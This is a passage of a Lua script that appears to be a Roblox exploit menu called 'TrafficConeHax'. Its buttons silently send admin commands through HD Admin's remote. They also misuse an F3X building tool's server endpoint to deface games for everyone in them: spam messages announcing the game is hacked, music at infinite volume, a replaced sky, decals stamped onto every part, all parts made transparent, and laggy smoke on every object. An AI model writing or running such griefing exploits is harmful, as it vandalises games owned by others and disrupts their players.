TextButton28.Name = "TextButton"
TextButton28.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton28.Text = "message 2"
TextButton28.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton28.TextSize = 14
TextButton28.TextWrapped = true
TextButton28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton28.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton28.BorderSizePixel = 2
TextButton28.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton28.Size = UDim2.new(0, 74, 0, 31)
TextButton28.Parent = R[226]

local LocalScript28 = Instance.new("Folder")
LocalScript28.Name = "LocalScript"
LocalScript28.Parent = TextButton28
__S[#__S + 1] = function(...)
local script = LocalScript28
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";sm Join Team TrafficConeHax!")
end)
end

local TextButton29 = Instance.new("TextButton")
TextButton29.Name = "TextButton"
TextButton29.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton29.Text = "message 3"
TextButton29.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton29.TextSize = 14
TextButton29.TextWrapped = true
TextButton29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton29.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton29.BorderSizePixel = 2
TextButton29.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton29.Size = UDim2.new(0, 74, 0, 31)
TextButton29.Parent = R[226]

local LocalScript29 = Instance.new("Folder")
LocalScript29.Name = "LocalScript"
LocalScript29.Parent = TextButton29
__S[#__S + 1] = function(...)
local script = LocalScript29
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";sm wow this game is hacked!!!")
end)
end

local TextButton30 = Instance.new("TextButton")
TextButton30.Name = "TextButton"
TextButton30.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton30.Text = "mario.exe     g00by version"
TextButton30.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton30.TextSize = 14
TextButton30.TextWrapped = true
TextButton30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton30.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton30.BorderSizePixel = 2
TextButton30.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton30.Size = UDim2.new(0, 74, 0, 31)
TextButton30.Parent = R[226]

local LocalScript30 = Instance.new("Folder")
LocalScript30.Name = "LocalScript"
LocalScript30.Parent = TextButton30
__S[#__S + 1] = function(...)
local script = LocalScript30
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";music 1332644289 ;volume inf ;pitch 0.8")
	wait(6)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";music 96415207507119 ;volume inf ;pitch 0.04")
	local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local SMALL_ID = "7866786419"
local ZERO = Vector3.new(0, 0, 0)
local SKY_MESH = "111891702759441"
local SKY_SCALES = { [99999] = true, [10000] = true, [11000] = true, [110000] = true }

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function getMeshScale(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.Scale
	end
	return Vector3.new(0, 0, 0)
end

local function getVertexColor(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.VertexColor
	end
	return Vector3.new(1, 1, 1)
end

-- A sky is any part whose SpecialMesh uses the sky mesh, whatever it is named
local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor or Vector3.new(1, 1, 1) } } })
end

function CreatePart(cf, parent)
	_({ "CreatePart", "Normal", cf, parent })
end

function AddMesh(part)
	_({ "CreateMeshes", { { Part = part } } })
end

function SetTexture(part, texid)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } })
end

function SetName(part, stringg)
	_({ "SetName", { part }, stringg })
end

function MeshResize(part, size)
	_({ "SyncMesh", { { Part = part, Scale = size } } })
end

function SetLocked(part, boolean)
	_({ "SetLocked", { part }, boolean })
end

function SetTrans(part, int)
	_({ "SyncMaterial", { { Part = part, Transparency = int } } })
end

function Color(part, color)
	_({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
end

function SyncLighting(part, brightness)
	_({ "SyncLighting", { { Part = part, LightType = "PointLight", Brightness = brightness } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	local finalColor = vertexColor or (mesh and mesh.VertexColor) or Vector3.new(1, 1, 1)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = finalColor } } })
end

-- Polls until an unnamed part has replicated at x,z and returns it
local function waitForPartAt(x, z, timeout)
	local start = os.clock()
	repeat
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not isSky(v) and v.CFrame.X == x and v.CFrame.Z == z then
				return v
			end
		end
		RunService.Heartbeat:Wait()
	until os.clock() - start > (timeout or 2)
	return nil
end

-- Finds the existing big (black) sky and the existing small (99999-ish) sky
local function findExisting()
	local big, small
	for _, v in ipairs(workspace:GetDescendants()) do
		if isSky(v) then
			if getVertexColor(v) == ZERO then
				big = big or v
			elseif SKY_SCALES[math.round(getMeshScale(v).X)] then
				small = small or v
			end
		end
	end
	return big, small
end

-- Configures a freshly created part as a sky
local function setupSky(v, spec)
	SetName(v, "Sky")
	AddMesh(v)

	SetMesh(v, SKY_MESH, spec.vertexColor)
	SetTexture(v, spec.id)
	MeshResize(v, Vector3.new(spec.scale, spec.scale, spec.scale))

	SetLocked(v, true)
	SetTrans(v, spec.transparency)

	_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

	Color(v, Color3.fromRGB(255, 255, 255))

	_({ "CreateLights", { { Part = v, LightType = "PointLight" } } })

	SyncLighting(v, 0)
end

function UpdateSkies()
	for i, v in game.Workspace:GetDescendants() do
		if isSky(v) then
			local specialMesh = v:FindFirstChildOfClass("SpecialMesh")
			if specialMesh then
				local vColor = specialMesh.VertexColor
				if vColor == ZERO then
					continue
				end

				local currentScale = specialMesh.Scale
				local currentTexture = specialMesh.TextureId:match("%d+") or ""
				local currentMeshId = specialMesh.MeshId:match("%d+") or SKY_MESH

				local targetVertexColor
				local targetTransparency

				if currentScale.X >= 105000 then
					targetVertexColor = ZERO
					targetTransparency = 0
				elseif currentScale.X >= 90000 and currentScale.X <= 100000 then
					targetVertexColor = Vector3.new(3.3, 3.3, 3.3)
					targetTransparency = 0.02
				else
					targetVertexColor = vColor
					targetTransparency = v.Transparency
				end

				if currentTexture ~= "" then
					UpdateMeshTextureAndColor(v, currentTexture, targetVertexColor)
				else
					SetMesh(v, currentMeshId, targetVertexColor)
				end

				SetLocked(v, true)
				SetTrans(v, targetTransparency)

				_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

				Color(v, Color3.fromRGB(255, 255, 255))
				SyncLighting(v, 0)
			end
		end
	end
end

-- Main
local big, small = findExisting()

if not small then
	-- only convert leftover skies when there's no small sky yet
	UpdateSkies()
	big, small = findExisting()
end

if small then
	-- rerun: only swap the image on the 99999 sky, leave the big one alone
	UpdateMeshTextureAndColor(small, SMALL_ID, nil)
end

local specs = {}
if not big then
	table.insert(specs, { id = "dont change this", transparency = 0, scale = 110000, vertexColor = ZERO, offset = Vector3.new(-25, -10, 0) })
end
if not small then
	table.insert(specs, { id = SMALL_ID, transparency = 0.02, scale = 99999, vertexColor = Vector3.new(4, 4, 4), offset = Vector3.new(25, -10, 0) })
end

if #specs > 0 then
	local hrp = char.HumanoidRootPart.CFrame
	local basePos = Vector3.new(math.floor(hrp.X), math.floor(hrp.Y), math.floor(hrp.Z))

	-- create every missing part at the same time
	for _, spec in ipairs(specs) do
		spec.pos = basePos + spec.offset
		task.spawn(CreatePart, CFrame.new(spec.pos) + Vector3.new(0, -10, 0), workspace)
	end

	-- then configure them all at the same time
	for _, spec in ipairs(specs) do
		task.spawn(function()
			local part = waitForPartAt(spec.pos.X, spec.pos.Z)
			if part then
				setupSky(part, spec)
			end
		end)
	end
end
wait(0.25)
	local id = "99015760365756"

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	local remote = tool.SyncAPI.ServerEndpoint
function _(args)
    return remote:InvokeServer(unpack(args))
end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
	
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
function ClonePart(table,parent)
    	 local args = {
           [1] ="Clone",
           [2] = table,
           [3] = parent
        }

    _(args)
end
function removetable(t)
    local args = { [1] = "Remove", [2] = {} }
    for _, v in pairs(t) do
        if v ~= nil and v:IsA("Decal") then
            table.insert(args[2],v)
       end
    end
  if #args[2] > 0 then
    _(args)
    end
end
	
           local testpart = remote:InvokeServer("CreatePart","Normal",CFrame.new(102938,182939,2928458), workspace.Terrain)
local root = testpart 
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Front)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Front)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Back)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Back)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Right)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Right)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Left)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Left)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Bottom)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Bottom)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Top)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Top)
                  end)
repeat task.wait()until root:FindFirstChildOfClass("Decal")
local decals = {}
for i,v in root: GetDescendants()do
if v:IsA"Decal"then 
table.insert(decals,v)
end
end
function exPro(root)
task.spawn(ClonePart,decals,root)
end



local decalsintothevoid={}


				for i,v in game.workspace:GetDescendants() do
           if v:IsA("Decal")then
            table.insert(decalsintothevoid,v)--if any new decals destroy them
            end
end
function asdf()
				for i,v in game.workspace:GetDescendants() do
					if v:IsA("BasePart") and v.Name ~= "Sky" then
          task.defer(exPro,v)
					end
				end 
end
			asdf()


if #decalsintothevoid>0 then
task.spawn(removetable,decalsintothevoid)
end

end)
end

local TextButton31 = Instance.new("TextButton")
TextButton31.Name = "TextButton"
TextButton31.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton31.Text = "create spawn"
TextButton31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton31.TextSize = 14
TextButton31.TextWrapped = true
TextButton31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton31.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton31.BorderSizePixel = 2
TextButton31.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton31.Size = UDim2.new(0, 74, 0, 31)
R[340] = TextButton31
TextButton31.Parent = R[226]


end
do -- chunk 4/6
local LocalScript = Instance.new("Folder")
LocalScript.Name = "LocalScript"
LocalScript.Parent = R[340]
__S[#__S + 1] = function(...)
local script = LocalScript
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";insert 53326")
end)
end

local TextButton = Instance.new("TextButton")
TextButton.Name = "TextButton"
TextButton.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton.Text = "create police car"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14
TextButton.TextWrapped = true
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton.BorderSizePixel = 2
TextButton.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton.Size = UDim2.new(0, 74, 0, 31)
TextButton.Parent = R[226]

local LocalScript2 = Instance.new("Folder")
LocalScript2.Name = "LocalScript"
LocalScript2.Parent = TextButton
__S[#__S + 1] = function(...)
local script = LocalScript2
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";insert 6418230807")
end)
end

local TextButton2 = Instance.new("TextButton")
TextButton2.Name = "TextButton"
TextButton2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton2.Text = "create sports cars"
TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.TextSize = 14
TextButton2.TextWrapped = true
TextButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton2.BorderSizePixel = 2
TextButton2.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton2.Size = UDim2.new(0, 74, 0, 31)
TextButton2.Parent = R[226]

local LocalScript3 = Instance.new("Folder")
LocalScript3.Name = "LocalScript"
LocalScript3.Parent = TextButton2
__S[#__S + 1] = function(...)
local script = LocalScript3
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";insert 6433323089")
end)
end

local TextButton3 = Instance.new("TextButton")
TextButton3.Name = "TextButton"
TextButton3.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton3.Text = "insert random shi"
TextButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.TextSize = 14
TextButton3.TextWrapped = true
TextButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton3.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton3.BorderSizePixel = 2
TextButton3.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton3.Size = UDim2.new(0, 74, 0, 31)
TextButton3.Parent = R[226]

local LocalScript4 = Instance.new("Folder")
LocalScript4.Name = "LocalScript"
LocalScript4.Parent = TextButton3
__S[#__S + 1] = function(...)
local script = LocalScript4
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";insert 12931195430")
RequestCommand:InvokeServer(";insert 13168370735")
RequestCommand:InvokeServer(";insert 6370681139")
end)
end

local TextButton4 = Instance.new("TextButton")
TextButton4.Name = "TextButton"
TextButton4.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton4.Text = "insert water"
TextButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton4.TextSize = 14
TextButton4.TextWrapped = true
TextButton4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton4.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton4.BorderSizePixel = 2
TextButton4.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton4.Size = UDim2.new(0, 74, 0, 31)
TextButton4.Parent = R[226]

local LocalScript5 = Instance.new("Folder")
LocalScript5.Name = "LocalScript"
LocalScript5.Parent = TextButton4
__S[#__S + 1] = function(...)
local script = LocalScript5
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";insert 82717697")
end)
end

local TextButton5 = Instance.new("TextButton")
TextButton5.Name = "TextButton"
TextButton5.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton5.Text = "make all parts transparent"
TextButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.TextSize = 14
TextButton5.TextWrapped = true
TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton5.BorderSizePixel = 2
TextButton5.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton5.Size = UDim2.new(0, 74, 0, 31)
TextButton5.Parent = R[226]

local LocalScript6 = Instance.new("Folder")
LocalScript6.Name = "LocalScript"
LocalScript6.Parent = TextButton5
__S[#__S + 1] = function(...)
local script = LocalScript6
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function SetTransparencyBatch()
	local targets = {}
	local matSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		table.insert(matSyncBatch, {
			["Part"] = part, 
			["Transparency"] = 0.5
		})
	end

	if #matSyncBatch > 0 then
		_({"SyncMaterial", matSyncBatch})
	end
end

SetTransparencyBatch()

end)
end

local TextButton6 = Instance.new("TextButton")
TextButton6.Name = "TextButton"
TextButton6.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton6.Text = "make all parts visible"
TextButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton6.TextSize = 14
TextButton6.TextWrapped = true
TextButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton6.BorderSizePixel = 2
TextButton6.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton6.Size = UDim2.new(0, 74, 0, 31)
TextButton6.Parent = R[226]

local LocalScript7 = Instance.new("Folder")
LocalScript7.Name = "LocalScript"
LocalScript7.Parent = TextButton6
__S[#__S + 1] = function(...)
local script = LocalScript7
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function SetTransparencyBatch()
	local targets = {}
	local matSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		table.insert(matSyncBatch, {
			["Part"] = part, 
			["Transparency"] = 0
		})
	end

	if #matSyncBatch > 0 then
		_({"SyncMaterial", matSyncBatch})
	end
end

SetTransparencyBatch()

end)
end

local TextButton7 = Instance.new("TextButton")
TextButton7.Name = "TextButton"
TextButton7.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton7.Text = "smoke all parts (laggy)"
TextButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton7.TextSize = 14
TextButton7.TextWrapped = true
TextButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton7.BorderSizePixel = 2
TextButton7.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton7.Size = UDim2.new(0, 74, 0, 31)
TextButton7.Parent = R[226]

local LocalScript8 = Instance.new("Folder")
LocalScript8.Name = "LocalScript"
LocalScript8.Parent = TextButton7
__S[#__S + 1] = function(...)
local script = LocalScript8
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function SmokeAllParts()
	local targets = {}
	local smokeCreateBatch = {}
	local smokeSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		table.insert(smokeCreateBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke"
		})
		table.insert(smokeSyncBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke", 
			["Size"] = 100, 
			["RiseVelocity"] = 25, 
			["Opacity"] = 1, 
			["Color"] = Color3.new(0.5, 0.5, 0.5)
		})
	end

	if #targets > 0 then
		_({"CreateDecorations", smokeCreateBatch})
		_({"SyncDecorate", smokeSyncBatch})
	end
end

SmokeAllParts()

end)
end

local TextButton8 = Instance.new("TextButton")
TextButton8.Name = "TextButton"
TextButton8.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton8.Text = " smoke red"
TextButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton8.TextSize = 14
TextButton8.TextWrapped = true
TextButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton8.BorderSizePixel = 2
TextButton8.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton8.Size = UDim2.new(0, 74, 0, 31)
TextButton8.Parent = R[226]

local LocalScript9 = Instance.new("Folder")
LocalScript9.Name = "LocalScript"
LocalScript9.Parent = TextButton8
__S[#__S + 1] = function(...)
local script = LocalScript9
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function RedSmokeAllParts()
	local targets = {}
	local smokeCreateBatch = {}
	local smokeSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		table.insert(smokeCreateBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke"
		})
		table.insert(smokeSyncBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke", 
			["Size"] = 100, 
			["RiseVelocity"] = 25, 
			["Opacity"] = 1, 
			["Color"] = Color3.new(1, 0, 0)
		})
	end

	if #targets > 0 then
		_({"CreateDecorations", smokeCreateBatch})
		_({"SyncDecorate", smokeSyncBatch})
	end
end

RedSmokeAllParts()

end)
end

local TextButton9 = Instance.new("TextButton")
TextButton9.Name = "TextButton"
TextButton9.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton9.Text = " smoke green"
TextButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.TextSize = 14
TextButton9.TextWrapped = true
TextButton9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton9.BorderSizePixel = 2
TextButton9.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton9.Size = UDim2.new(0, 74, 0, 31)
TextButton9.Parent = R[226]

local LocalScript10 = Instance.new("Folder")
LocalScript10.Name = "LocalScript"
LocalScript10.Parent = TextButton9
__S[#__S + 1] = function(...)
local script = LocalScript10
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function RedSmokeAllParts()
	local targets = {}
	local smokeCreateBatch = {}
	local smokeSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		table.insert(smokeCreateBatch, {
			["Part"] = part, 
			["DecorationType"] = "Smoke"
		})
